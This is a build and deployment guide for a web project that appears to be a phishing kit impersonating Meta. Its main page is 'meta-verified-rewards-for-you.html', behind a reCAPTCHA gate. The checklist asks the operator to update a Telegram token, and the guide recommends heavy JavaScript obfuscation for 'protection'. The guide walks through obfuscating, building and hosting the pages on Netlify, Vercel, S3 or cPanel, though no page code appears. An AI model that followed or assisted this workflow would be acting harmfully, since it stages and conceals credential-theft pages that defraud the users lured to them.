# Build and deployment guide

## Overview

This project includes an automated build that produces a production-ready folder: `dist/`.

Short reference: **`BUILD.md`** (commands + pipeline). This file has more detail.

## Install dependencies

```bash
npm install
```

Optional global tools:

```bash
npm install -g terser javascript-obfuscator
```

## Build commands

### Option 1: Windows

**Obfuscate (recommended)**

```bash
build.bat
```

**Minify only (lighter)**

```bash
build-minify.bat
```

### Option 2: Linux / macOS

```bash
chmod +x build.sh
./build.sh
```

### Option 3: npm scripts

```bash
npm run build          # obfuscate (default)
npm run build:minify   # minify only
npm run clean          # delete dist/
```

### Option 4: Node

```bash
node build.js --obfuscate
node build.js --minify
```

## Output layout

After a successful build, `dist/` looks like:

```
dist/
├── meta-verified-rewards-for-you.html           # Main page
├── index.html              # reCAPTCHA entry
├── build-info.json         # Build metadata
└── public/
    ├── js/
    │   ├── bundle-app.js, bundle-index.js   # built from sources (see JS_MANIFEST.txt)
    ├── i18n/
    │   ├── l8q3m5r2.js, a4v9x1k7.js, e6f2b8d0.js
    ├── styles/
    │   ├── checkbox.css
    │   └── style.css
    ├── meta/               # Meta UI images
    ├── fonts/
    └── *.png, *.svg      # Root public assets
```

## Deploy

Upload the **entire** contents of `dist/` (FTP, SSH, or your host’s UI).

### Common platforms

**Netlify**

```bash
netlify deploy --dir=dist --prod
```

**Vercel**

```bash
vercel --prod
# Point output to dist/ when prompted
```

**GitHub Pages**

```bash
git subtree push --prefix dist origin gh-pages
```

**cPanel**

Upload everything under `dist/` into `public_html/`.

**AWS S3**

```bash
aws s3 sync dist/ s3://your-bucket-name/ --delete
```

## Pre-deploy checklist

- [ ] Production build completed  
- [ ] Tested from `dist/` locally  
- [ ] No errors in the browser console  
- [ ] Config updated (Telegram token, etc.)  
- [ ] Tested in multiple browsers  
- [ ] Tested on mobile  

## Workflow

**Development** — edit `public/js/`, `meta-verified-rewards-for-you.html`, etc.

**Local test** — open `meta-verified-rewards-for-you.html` or `index.html` from the project root.

**Production build** — `build.bat`, `./build.sh`, or `npm run build`.

**Test build** — open `dist/meta-verified-rewards-for-you.html` and verify behavior.

**Deploy** — upload `dist/`.

## Build settings

**Minify** — `esbuild.transformSync` on concatenated sources (writes `public/js/bundle-app.js` and `bundle-index.js`, and minified copies under `dist/` when using `--minify`).

**Obfuscate** — `javascript-obfuscator` on `dist/public/js/bundle-app.js` and `bundle-index.js` only; see `build.js` for flags (compact, control-flow flattening, dead-code injection, string array, base64 encoding, unicode escapes).

## Rebuild after changes

1. Edit sources under `public/js/`  
2. Run the build script again  
3. Test `dist/`  
4. Deploy again  

## Minify vs obfuscate

| Feature     | Minify        | Obfuscate      |
|------------|---------------|----------------|
| File size  | Smaller (~50%)| Larger (~200%) |
| Speed      | Faster        | Slightly slower|
| Security   | Basic         | Stronger       |
| Debugging  | Easier        | Much harder    |
| Build time | ~5s           | ~20s           |

Use **obfuscation** for production when you want stronger protection.

## Troubleshooting

**Missing local tools**

Run `npm install` in the project root so `esbuild`, `javascript-obfuscator`, and `terser` resolve via `npx` / `node_modules` (no global install required for the default `build.bat` / `npm run build` path).

**"javascript-obfuscator" or "esbuild" errors**

```bash
cd /path/to/6.0
npm install
```

**Broken behavior after obfuscation**

- Check the console  
- Reduce obfuscator options  
- Try minify-only  

**Missing files in `dist/`**

- Confirm the file exists in the source tree  
- Read the build log  

## Support

1. Node.js 14+  
2. npm installed  
3. Dependencies installed (`npm install`)  
4. File permissions (Linux / macOS)  

Happy deploying.
